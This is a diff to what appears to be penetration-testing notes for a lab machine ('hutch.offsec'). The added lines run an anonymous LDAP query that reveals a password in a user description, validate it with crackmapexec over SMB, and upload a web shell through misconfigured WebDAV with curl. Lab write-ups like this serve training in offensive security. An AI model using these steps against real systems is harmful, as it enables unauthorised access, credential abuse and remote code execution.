@@ -468,6 +468,14 @@ print()
 nmap -n -sV --script "ldap* and not brute" 192.168.137.122
 ldapsearch -x -h 192.168.137.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
  grep sAMAccountName:
+ ldapsearch -x -h 192.168.137.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
+ grep description:
+ 
+ ***LDAP recorded the password change and had it listed, the last user to use it was fmcsorley.***
+ crackmapexec smb 192.168.137.122 -u fmcsorley -p CrabSharkJellyfish192
+ 
+ ***WITH VALID CREDS I CAN UPLOAD TO THE WEBSERVER DUE TO INCORRECT WEBDAV***
+ curl -T '/home/bruiser/Tools/shell.aspx' 'http://192.168.137.122/' -u fmcsorley:CrabSharkJellyfish192
 ```
 
 # LINUX PRIVESC
